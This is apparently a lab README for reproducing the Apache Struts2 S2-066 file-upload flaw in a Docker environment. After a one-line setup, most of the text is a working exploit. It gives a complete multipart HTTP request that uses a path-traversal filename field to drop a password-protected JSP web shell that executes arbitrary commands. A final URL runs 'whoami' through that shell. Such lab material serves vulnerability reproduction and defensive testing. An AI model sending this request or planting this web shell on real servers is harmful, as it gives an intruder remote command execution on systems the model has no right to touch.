# Struts2 S2-066

[中文版本(Chinese version)](README.zh-cn.md)

## Setup

```
docker compose up -d
```

After the environment is started, visit `http://your-ip:8080/struts-1.0-SNAPSHOT` and you will see a simple page.

## Exploit


```
POST /struts-1.0-SNAPSHOT/upload.action HTTP/1.1
Host: 127.0.0.1
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="1.txt"
Content-Type: text/plain

<% if("test".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="uploadFileName"; 
Content-Type: text/plain

../shell.jsp
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--

```

`http://127.0.0.1:8080/struts-1.0-SNAPSHOT/shell.jsp?pwd=test&cmd=whoami`